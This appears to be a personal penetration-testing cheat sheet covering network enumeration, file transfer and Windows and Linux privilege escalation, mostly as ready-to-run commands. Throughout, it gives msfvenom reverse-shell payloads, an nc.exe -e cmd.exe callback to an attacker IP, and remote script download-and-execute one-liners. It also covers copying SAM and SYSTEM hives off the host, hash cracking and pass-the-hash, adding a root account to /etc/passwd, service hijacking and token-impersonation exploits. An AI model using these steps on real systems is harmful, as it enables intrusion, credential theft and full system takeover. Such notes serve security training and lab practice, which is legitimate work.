## Setting
1.export ip=10.10.10.10\
1.5 make directory for nmap result: mkdir nmap && cd nmap
## Ennumeration
2. `nmap -sC -sV -p- -Pn $ip --open -oN result`   AND  `rustscan -a $IP and rustscan -a $IP`. 
3. Check which ports are open. Take note of service running and versions(for searchsploit)\
4. Manual ennumeration. Visit the open ports to see if we can get initial foothold information. e.g anoymous login, default login,etc\
5. Check for vulnerabiltieis on specific ports using nmap script `nmap -p 80,445,139 --script=*vuln* $IP`
## Check vulnerabilities and enumerate for each port
0. Go to the differnet MD files in the repository .

## Creating a reverseshell, uploading a revershell  / creating a stageless payload
0. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1237 -f exe  -o reverse.exe` 
1. `msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=1234 -f asp -o reverse.asp` 

## File Transfer to Window 

### File transfer via web server
0. `python3 -m http.server 8080` from linux
1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe') -exec bypass` from window
2. `certutil.exe -urlcache -f  http://myIp:80/winpeas.exe` from window
### File Transfer via SMB
0. `mkdir share` and move files to transfer
1. `impacket-smbserver smb share/ ` from linux
2. `net use \\myIP\smb` from window
3. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 
4. `copy c:\Windows\Repair\SAM \\MYIP\tools\` copy content to my kali
5. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`

 # Privilege Escalation for Window
 0. Use PowerUp
 1. `Import-Module .\PowerUp.ps1` or `. .\PowerUp.ps1`
 2. `Invoke-AllChecks`
 3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
 4. Use WinPeas
 5. `winpeas.exe`
 6. Use SharUp if you cant run winpeas or powerup 
 7. `.\SharpUp.exe`
 ## Service Misconfiguration
- `sc.exe qc <name>` Query the configuration of a service
- `sc.exe query <name>`Query the current status of a service
- `sc.exe config <name> <option>= <value>`Modify a configuration option of a service
`- net start/stop <name>`#Start/Stop a service
### Insecure Service Permissions (Modifileable service)
0. If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
1. Things to look for (e.g. SERVICE_STOP, SERVICE_START).
2. Things to look for (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
3. Things to look out for ***Rabit Hole*** If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
4. `.\winPeas.exe quiet servicesinfo` query for only services
5. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>`  confirm with accesscheck that we can change_CONFIG and start service.
6.  `sc qc <SERVICENAME>`  query the service configuration and look at start type, binary path name, dependencies
7.  `sc query <SERVICENAME>` check the current status of the service.
8.  `sc config <SERVICENAME> binpath="\"C:\PrivEsc\reverse.exe\""` set the binary path to the location of the revershell payload. 
9.  Start a netcat listener and `net start <SERVICENAME>`
10.  
 ### Unquoted Service Path
 0. `.\winPeas.exe quiet servicesinfo` Look for No quotes and Space detected in winpeas
 1. `Get-UnquotedService` (PowerUp) or `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`\ 
 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check permission if we can restart the service.
 3. Use accesschk.exe to check for write permissions in each binary path (if BUILTIN/user can write, we should write it in that path)
  ``` 
  > .\accesschk.exe /accepteula -uwdq C:\
  > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
  > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
  ```
 6.`msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=LISTENINGPORT -f exe  -o Program.exe` (Name payload accordingly to the path writable)\
 7. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"` copy file
 8. start a netcat listenr, and `net start <SERVICENAME>`
 
 ### Weak Registery Permissions (Modify service registry)
1. Same winPeas command as above.
2. `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<SERVICENAME>` check if its writable i.e (NT AUTHORITY\Interactive)
3. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>` check if we can restart the service
4.  `reg query HKLM\System\CurrentControlSet\Services\<SERVICENAME>` Check the current value and see bin path.
5.  `reg add HKLM\SYSTEM\CurrentControlSet\services\<SERVICENAME> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` change bin path
6.  start a netcat listener and `net start <SERVICENAME>`


 ### Insecure service Executable i.e Writable Executable
 1. `> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe" The c:\Program Files should be changed to my vul path. check we can write on the path
 2. `.\accesschk.exe /accepteula -uwcqv user <SERVICENAME>`  check we can stop and start service
 3. `copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp` create a backup of original service
 4. `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"` copy reverse shell to vul path
 5.  start a netcat listener  and `net start <SERVICENAME>`
 
 ### Writable Service Executable
  0.`Invoke-AllChecks`\
  1.`msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f exe >service.exe`  (payload name has to be same as writable service) 


 ### DLL Hijacking 
 1.   `.\winPeas.exe quiet servicesinfo` Check write permissions in Path folder(DLL hijacking)
 2.  `.\accesschk.exe /accepteula -uvqc user <SERVICENAME>` ***check non microsoft service that has Stop and Start access***
 3. ` sc qc <SERVICENAME>` confirm manually that it runs with local system
 4. In process

 ### Registry (Exploit the AUTO RUN in registery)
 1.  `.\winPEASany.exe quiet applicationsinfo` or manually `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
 2.  If done manually use accescheck to verfiy every file location. E.G.`\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
 3.  `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"` copy revershell
 4.  start a netcat listener and login as admin and restart

 
 ### AlwaysInstallElevate
 check if both values are 1.\
 0. `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
 1. `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\ 
 2. or ` reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated and 
 3. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 4. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >reverse.msi`  (create a payload) 
 5. Transfer payload to Temp and execute
 6. `msiexec /quiet  /qn /i "C:\Windows\Temp\reverse.msi"`


 ### SeImpersonatePrivilege 
 
 
 ### Kernal exploits (last resort)
 0. Extract `systeminfo` and save it to systeminfo.txt in kali (should be in same directory)
 1. `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more`
 2. cross reference with the site https://github.com/SecWiki/windows-kernel-exploits to see if we have binaries
 3. Move the binary to window victim and run it with reverseshell to get root. 
 4. open netcat listener 
 5.  `.\x64.exe C:\PrivEsc\reverse.exe`
 
 
 ### Passwords
 1. `.\winPEASany.exe quiet filesinfo userinfo` or manually  ` reg query HKLM /f password /t REG_SZ /s` and `reg query HKCU /f password /t REG_SZ /s`
 2. `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
 3. `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
 4. `winexe -U 'admin%password123' //TARGETIP cmd.exe` spawn a shell with kali
 5. or `winexe -U 'admin%password123' --system //TARGETIP cmd.exe` for system privilege
 ### Saved Credentials
 1. `.\winPEASany.exe quiet cmd windowscreds`
 2. ` cmdkey /list` to confirm manually  if there arent any saved creds  try `C:\PrivEsc\savecred.bat`
 3. start netcat linstener
 4. `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
 ### Configuration files
1.  `.\winPEASany.exe quiet cmd searchfast filesinfo`
2. Run recursive command manually. Do not run it on C:\ root but on `user directory or admin directory`
3. ` dir /s *pass* == *.config`  and ` findstr /si password *.xml *.ini *.txt`
4.  `winexe -U 'admin%password123' //TARGETIP cmd.exe`

### SAM (Security Account Manager)

1. `.\winPEASany.exe quiet cmd searchfast filesinfo`
2. `copy C:\Windows\Repair\SAM \\MYIP\MYDIRECTORY\` and `copy C:\Windows\Repair\SYSTEM \\MYIP\MYDIRECTORY\` copy the SAM and KEY(SYSTEM) to local kali
3. `git clone https://github.com/Neohapsis/creddump7.git` download from kali
4.  `python2 creddump7/pwdump.py SYSTEM SAM` Run in the location of your copied SAM, SYSTEM file 
5.   `hashcat -m 1000 --force NTLMHASH(2ndpart) /usr/share/wordlists/rockyou.txt` and then use `winexe`.
6.   Or without cracking the hash-> pass the hash
7.   `pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da(ENTIREHASH)' //TARGETIP cmd.exe`


### Scheduled Tasks
1. Check directories that we have not seen
2. `schtasks /query /fo LIST /v` OR Powershell 
3.  `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1 ` access check  if we can write
4.  start a netcat listener
5.  `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1` copy our revershell location to script

### Insecure GUI Apps (Some older version)

### Startup Apps 
1. `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` check permissions on the StartUp directory eg (BUILTIN\Users group)
2. create a vb script eg CreatShortCut.vbs in kali and transfer. (Change path accordingly)
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

```
3. `cscript CreateShortcut.vbs` run the script 
4. Start a listener on Kali, then log in as the admin user to trigger the exploit

### Exploit Installed Application 
1.  `tasklist /v` Manually Enumerate all the task list or automatically by the following programs
2.   `.\seatbelt.exe NonstandardProcesses `
3.  ` .\winPEASany.exe quiet procesinfo`  
4.  If you find an interesting process, identify the ***version*** by running `<SERVICENAME> /?` or `<SERVICENAME> -h' or text files and config.
5.  Go to Exploit DB https://www.exploit-db.com/?type=local&platform=windows  and see if there are any.

### Token Impersonation 
1. Windows 7
2. `whoami /priv` to see `SeImpersonatePrivilege` is allowed
3. Transfer Juicy Potato.exe 
4. `msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.159 lport=9999 > myshell.bat ` create a revershell bat 
5. Transfer the bat
6. `JuciyPotato.exe -t * -p myshell.bat -l 9999` (port has to be same as reverseshell)

## File Transfer to Linux 
0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
1.`python3 -m http.server 8080` `or( 80)`
2.`cd /tmp` move directory where we have write access.
4.`wget http://$myIP:8080/linEum.sh .` \
7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225



# Privilege Escalation for Linux
0. `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` which would execute script (run from cd /tmp)
1. `chmod +x linpeas.sh` and `./linpeas.sh`
2. `wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh (use lin enum smart)`
3. or `curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh`
4. For linSmart start with `./lse.sh -i` then `./lse.sh -i -l 1` and `./lse.sh -i -l 2` for more verbosity.  




### Weak File Permission
1. ***Readable weak file Permission*** `ls -l /etc/shadow` manually check if it is readable or writable
2.  the root user hash. Hash is from start of first : and before :
3.  echo `'<HASH> >' hash.txt`
4.  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` crack the hash. If you know the type of encrtyption add e.g `--format=sha512crypt`
5.  switch to root user using `su`
6.  ***Writable weeak file permission***
```
openssl passwd evil
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

```
or
```
mkpasswd -m sha-512 newpassword 
$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
subl /etc/shadow # Copy the hash in to root and leave others.
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
su 
```
7. `root::0:0:root:/root:/bin/bash` Without the `x` after root, means there is no password. `su`
8. ***Backup files in interesting locations***
9.   Refer to the link to see if any files are differernt/stands out https://linuxhandbook.com/linux-directory-structure/ from the below command
10.   `ls -la /home/user`  `ls -la /` `ls -la /tmp` `ls -la /var/backups`
### Service Exploit
1.   If there is some unusual service, look for version numbers and look in searchsploit, google, github
2.   `ps aux | grep "^root"` show all processes running as root.
3.   `./lse.sh -i -l 1`and see services running with root
4.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.

### Sudo exploit

### Kernal exploit (last resort)
1.  https://www.exploit-db.com/exploits/44298 (check this one out :) )
2.`uname -a` `cat /etc/issue` Enumerate kernel version
3. Find matching exploits (Google, ExploitDB, GitHub) ` searchsploit <KERNAL VERSION> priv esc` on kali
4. https://github.com/jondonas/linux-exploit-suggester-2 . Transfer file and run
5. `./linux-exploit-suggester-2.pl –k <KERNAL VERSION> ` (dirty cow is a popular exploit)
6. Enter `/usr/bin/passwd ` to get  a root shell
7. Kernal exploit may be a one shot ...and may crash the system. /usr/bin/passwd 



